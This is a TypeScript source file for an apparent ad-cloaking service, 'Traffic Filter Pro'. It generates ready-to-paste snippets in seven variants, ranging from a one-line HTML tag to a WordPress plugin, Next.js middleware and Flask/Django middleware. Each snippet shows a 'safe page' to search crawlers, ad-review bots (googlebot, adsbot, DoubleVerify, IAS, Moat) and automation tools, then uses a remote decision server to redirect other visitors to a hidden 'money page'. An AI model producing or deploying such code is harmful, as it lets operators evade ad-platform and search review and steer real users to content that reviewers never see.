// ============================================================
// TRACKING CODE GENERATOR
// All variants use campaign_code — no sensitive URLs in client code
// ============================================================

export interface WebsiteConfig {
  id: string | number
  name: string
  domain: string
  campaign_code: string
  landing_page_url: string
  safe_page_url: string
  allowed_countries: string[]
  blocked_ad_platforms: string[]
  max_visit_limit?: number
  visit_limit_time_hours?: number
  cloaking_enabled?: boolean
}

// ── 1. HTML <script> tag — cleanest, just one line ─────────
export function generateHtmlCode(website: WebsiteConfig, appUrl: string): string {
  const base = appUrl.replace(/\/$/, "")
  return `<!-- Traffic Filter Pro — ${website.name} -->
<!-- Paste inside <head> of your safe page (first script) -->
<script src="${base}/track.js?c=${website.campaign_code}" async></script>`
}

// ── 2. Standalone JS file ──────────────────────────────────
export function generateJsFile(website: WebsiteConfig, appUrl: string): string {
  const base = appUrl.replace(/\/$/, "")
  return `/**
 * Traffic Filter Pro — ${website.name}
 * Save as: tfp.js
 * Add to safe page: <script src="tfp.js"></script>
 *
 * This file fetches the filter decision from the server at load time.
 * It is safe to host on a CDN.
 */
(function(){
  var s=document.createElement('script');
  s.src='${base}/track.js?c=${website.campaign_code}';
  s.async=true;
  document.head.appendChild(s);
})();`
}

// ── 3. PHP inline (paste at top of PHP safe page) ─────────
export function generatePhpInline(website: WebsiteConfig, appUrl: string): string {
  const base = appUrl.replace(/\/$/, "")
  return `<?php
/**
 * Traffic Filter Pro — ${website.name}
 * Paste this at the TOP of your PHP file (before any HTML output)
 * Only put it on your safe page — NOT on the money page
 */

function tfp_check() {
    $app    = ${JSON.stringify(base)};
    $code   = ${JSON.stringify(website.campaign_code)};
    $ua     = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ip     = $_SERVER['HTTP_CF_CONNECTING_IP']
           ?? $_SERVER['HTTP_X_FORWARDED_FOR']
           ?? $_SERVER['REMOTE_ADDR'] ?? '';
    $ip     = trim(explode(',', $ip)[0]);
    $ref    = $_SERVER['HTTP_REFERER'] ?? '';
    $host   = $_SERVER['HTTP_HOST']    ?? '';

    // Quick bot check before API call
    $bots = ['/bot\\b/i','/crawler/i','/spider/i','/googlebot/i','/bingbot/i',
             '/facebookexternalhit/i','/bytespider/i','/selenium/i',
             '/puppeteer/i','/playwright/i','/headless/i','/webdriver/i',
             '/curl\\//i','/wget\\//i','/python-requests/i','/doubleverify/i',
             '/ias[-_]?crawler/i','/moat/i','/gptbot/i','/adsbot/i'];
    foreach ($bots as $p) {
        if (preg_match($p, $ua)) return;
    }

    // Ask filter server for decision
    $ch = curl_init($app . '/api/track-visit');
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => json_encode([
            'campaignCode'    => $code,
            'userAgent'       => $ua,
            'referrer'        => $ref,
            'url'             => 'https://' . $host . ($_SERVER['REQUEST_URI'] ?? '/'),
            'detectedCountry' => strtoupper($_SERVER['HTTP_CF_IPCOUNTRY']
                              ?? $_SERVER['HTTP_X_VERCEL_IP_COUNTRY'] ?? ''),
            'clientBotDetection' => ['isBot' => false, 'botType' => null],
        ]),
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 3,
    ]);
    $res  = curl_exec($ch);
    curl_close($ch);

    if ($res) {
        $data = json_decode($res, true);
        $act  = $data['action'] ?? '';
        if ($act === 'redirect_money' || $act === 'redirect_safe') {
            if (!empty($data['redirectUrl'])) {
                header('Location: ' . $data['redirectUrl']);
                exit;
            }
        }
    }
}

tfp_check();
?>
<!DOCTYPE html>
<!-- Your safe page HTML continues here -->`
}

// ── 4. PHP separate file ───────────────────────────────────
export function generatePhpFile(website: WebsiteConfig, appUrl: string): string {
  const base = appUrl.replace(/\/$/, "")
  return `<?php
/**
 * Traffic Filter Pro — ${website.name}
 * Step 1: Save as tfp-filter.php in your server root
 * Step 2: Add at the TOP of your safe page: <?php require_once __DIR__ . '/tfp-filter.php'; ?>
 */

if (!defined('TFP_LOADED')) {
    define('TFP_LOADED', true);

    define('TFP_APP',  ${JSON.stringify(base)});
    define('TFP_CODE', ${JSON.stringify(website.campaign_code)});

    function tfp_ip() {
        foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $k) {
            if (!empty($_SERVER[$k])) return trim(explode(',', $_SERVER[$k])[0]);
        }
        return '';
    }

    function tfp_run() {
        $ua  = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $ref = $_SERVER['HTTP_REFERER']    ?? '';
        $url = 'https://' . ($_SERVER['HTTP_HOST'] ?? '') . ($_SERVER['REQUEST_URI'] ?? '/');
        $country = strtoupper($_SERVER['HTTP_CF_IPCOUNTRY']
                ?? $_SERVER['HTTP_X_VERCEL_IP_COUNTRY'] ?? '');

        // Quick bot UA check
        $bots = ['/bot\\b/i','/crawler/i','/googlebot/i','/bingbot/i',
            '/facebookexternalhit/i','/bytespider/i','/selenium/i',
            '/puppeteer/i','/playwright/i','/headless/i','/webdriver/i',
            '/curl\\//i','/wget\\//i','/python-requests/i',
            '/doubleverify/i','/ias[-_]?crawler/i','/gptbot/i'];
        foreach ($bots as $p) { if (preg_match($p, $ua)) return; }

        $ch = curl_init(TFP_APP . '/api/track-visit');
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => json_encode([
                'campaignCode'       => TFP_CODE,
                'userAgent'          => $ua,
                'referrer'           => $ref,
                'url'                => $url,
                'detectedCountry'    => $country,
                'clientBotDetection' => ['isBot' => false, 'botType' => null],
            ]),
            CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 3,
        ]);
        $res = curl_exec($ch);
        curl_close($ch);

        if ($res) {
            $data = json_decode($res, true);
            $act  = $data['action'] ?? '';
            if (($act === 'redirect_money' || $act === 'redirect_safe') && !empty($data['redirectUrl'])) {
                header('Location: ' . $data['redirectUrl']);
                exit;
            }
        }
    }

    tfp_run();
}`
}

// ── 5. WordPress plugin ────────────────────────────────────
export function generateWordPressPlugin(website: WebsiteConfig, appUrl: string): string {
  const base = appUrl.replace(/\/$/, "")
  return `<?php
/**
 * Plugin Name: Traffic Filter Pro — ${website.name}
 * Version: 1.0.0
 *
 * INSTALL: Save as tfp-filter/tfp-filter.php → zip → WP Admin → Plugins → Upload
 */

if (!defined('ABSPATH')) exit;

define('TFP_APP',  ${JSON.stringify(base)});
define('TFP_CODE', ${JSON.stringify(website.campaign_code)});

// Option A — inject lightweight JS tag into <head> (preferred)
add_action('wp_head', function() { ?>
<script src="<?php echo TFP_APP; ?>/track.js?c=<?php echo TFP_CODE; ?>" async></script>
<?php }, 1);

// Option B — server-side check before page renders (stronger, uncomment to use)
/*
add_action('init', function() {
    if (is_admin()) return;
    $ua  = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $bots = ['bot','crawler','googlebot','bingbot','facebookexternalhit',
             'bytespider','selenium','puppeteer','playwright','headless',
             'webdriver','curl/','wget/','python-requests','doubleverify','gptbot'];
    $ua_lower = strtolower($ua);
    foreach ($bots as $b) { if (strpos($ua_lower, $b) !== false) return; }

    $country = strtoupper($_SERVER['HTTP_CF_IPCOUNTRY']
            ?? $_SERVER['HTTP_X_VERCEL_IP_COUNTRY'] ?? '');

    $response = wp_remote_post(TFP_APP . '/api/track-visit', [
        'body'    => json_encode([
            'campaignCode'       => TFP_CODE,
            'userAgent'          => $ua,
            'referrer'           => $_SERVER['HTTP_REFERER'] ?? '',
            'url'                => home_url(add_query_arg(null, null)),
            'detectedCountry'    => $country,
            'clientBotDetection' => ['isBot' => false, 'botType' => null],
        ]),
        'headers' => ['Content-Type' => 'application/json'],
        'timeout' => 3,
    ]);
    if (!is_wp_error($response)) {
        $data = json_decode(wp_remote_retrieve_body($response), true);
        $act  = $data['action'] ?? '';
        if (($act === 'redirect_money' || $act === 'redirect_safe') && !empty($data['redirectUrl'])) {
            wp_redirect($data['redirectUrl']); exit;
        }
    }
}, 1);
*/`
}

// ── 6. Next.js middleware ──────────────────────────────────
export function generateNextjsCode(website: WebsiteConfig, appUrl: string): string {
  const base = appUrl.replace(/\/$/, "")
  return `// middleware.ts — place in your Next.js project root
// Traffic Filter Pro — ${website.name}
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

const TFP_APP  = ${JSON.stringify(base)}
const TFP_CODE = ${JSON.stringify(website.campaign_code)}

const BOT_UA = [/bot\\b/i,/crawler/i,/googlebot/i,/bingbot/i,/facebookexternalhit/i,
  /bytespider/i,/selenium/i,/puppeteer/i,/playwright/i,/headless/i,/webdriver/i,
  /curl\\//i,/wget\\//i,/python-requests/i,/doubleverify/i,/gptbot/i]

export async function middleware(req: NextRequest) {
  const ua      = req.headers.get('user-agent') || ''
  const country = (req.headers.get('x-vercel-ip-country') || req.headers.get('cf-ipcountry') || '').toUpperCase()

  if (BOT_UA.some(p => p.test(ua))) return NextResponse.next()

  try {
    const res = await fetch(TFP_APP + '/api/track-visit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        campaignCode: TFP_CODE, userAgent: ua, detectedCountry: country,
        clientBotDetection: { isBot: false, botType: null },
      }),
      signal: AbortSignal.timeout(2000),
    })
    if (res.ok) {
      const data = await res.json()
      const act  = data.action || ''
      if ((act === 'redirect_money' || act === 'redirect_safe') && data.redirectUrl) {
        return NextResponse.redirect(data.redirectUrl)
      }
    }
  } catch {}

  return NextResponse.next()
}

export const config = {
  matcher: ['/((?!api|_next/static|_next/image|favicon.ico).*)'],
}`
}

// ── 7. Python Flask / Django ───────────────────────────────
export function generatePythonCode(website: WebsiteConfig, appUrl: string): string {
  const base = appUrl.replace(/\/$/, "")
  return `# Traffic Filter Pro — ${website.name}
# Flask: app.before_request(tfp_check)
# Django: add TFPMiddleware to MIDDLEWARE

import re, json, urllib.request

TFP_APP  = ${JSON.stringify(base)}
TFP_CODE = ${JSON.stringify(website.campaign_code)}

BOT_UA = [re.compile(p, re.IGNORECASE) for p in [
    r'bot\\b', r'crawler', r'googlebot', r'bingbot', r'facebookexternalhit',
    r'bytespider', r'selenium', r'puppeteer', r'playwright', r'headless',
    r'curl/', r'wget/', r'python-requests', r'doubleverify', r'gptbot',
]]

def tfp_api_check(ua, country, url):
    try:
        payload = json.dumps({'campaignCode': TFP_CODE, 'userAgent': ua,
            'detectedCountry': country, 'clientBotDetection': {'isBot': False, 'botType': None},
            'url': url}).encode()
        req = urllib.request.Request(TFP_APP + '/api/track-visit',
            data=payload, headers={'Content-Type': 'application/json'}, method='POST')
        with urllib.request.urlopen(req, timeout=3) as r:
            data = json.loads(r.read())
            act = data.get('action', '')
            if act in ('redirect_money', 'redirect_safe') and data.get('redirectUrl'):
                return data['redirectUrl']
    except Exception:
        pass
    return None

# Flask
def tfp_check():
    from flask import request, redirect
    ua = request.headers.get('User-Agent', '')
    if any(p.search(ua) for p in BOT_UA): return None
    country = (request.headers.get('CF-IPCountry') or request.headers.get('X-Vercel-IP-Country', '')).upper()
    url = tfp_api_check(ua, country, request.url)
    return redirect(url) if url else None

# Django
class TFPMiddleware:
    def __init__(self, get_response): self.get_response = get_response
    def __call__(self, request):
        ua = request.META.get('HTTP_USER_AGENT', '')
        if not any(p.search(ua) for p in BOT_UA):
            country = (request.META.get('HTTP_CF_IPCOUNTRY') or request.META.get('HTTP_X_VERCEL_IP_COUNTRY', '')).upper()
            url = tfp_api_check(ua, country, request.build_absolute_uri())
            if url:
                from django.shortcuts import redirect
                return redirect(url)
        return self.get_response(request)`
}

// ── Export ─────────────────────────────────────────────────
export const CODE_VARIANTS = [
  { id: "html",      label: "HTML Script Tag",      ext: "html", lang: "html",       icon: "html5",            desc: "Any website — paste one line in <head>" },
  { id: "js",        label: "JavaScript File",       ext: "js",   lang: "javascript", icon: "brand-javascript", desc: "Host on CDN, load with <script src>" },
  { id: "php_inline",label: "PHP Inline",            ext: "php",  lang: "php",        icon: "brand-php",        desc: "Paste at top of PHP file" },
  { id: "php_file",  label: "PHP File",              ext: "php",  lang: "php",        icon: "brand-php",        desc: "Upload tfp-filter.php, require_once it" },
  { id: "wordpress", label: "WordPress Plugin",      ext: "php",  lang: "php",        icon: "brand-wordpress",  desc: "Zip and install as WP plugin" },
  { id: "nextjs",    label: "Next.js Middleware",    ext: "ts",   lang: "typescript", icon: "brand-nextjs",     desc: "Edge middleware for Next.js projects" },
  { id: "python",    label: "Python (Flask/Django)", ext: "py",   lang: "python",     icon: "brand-python",     desc: "Flask before_request or Django middleware" },
]

export function generateCode(variant: string, website: WebsiteConfig, appUrl: string): string {
  switch (variant) {
    case "html":       return generateHtmlCode(website, appUrl)
    case "js":         return generateJsFile(website, appUrl)
    case "php_inline": return generatePhpInline(website, appUrl)
    case "php_file":   return generatePhpFile(website, appUrl)
    case "wordpress":  return generateWordPressPlugin(website, appUrl)
    case "nextjs":     return generateNextjsCode(website, appUrl)
    case "python":     return generatePythonCode(website, appUrl)
    default:           return generateHtmlCode(website, appUrl)
  }
}
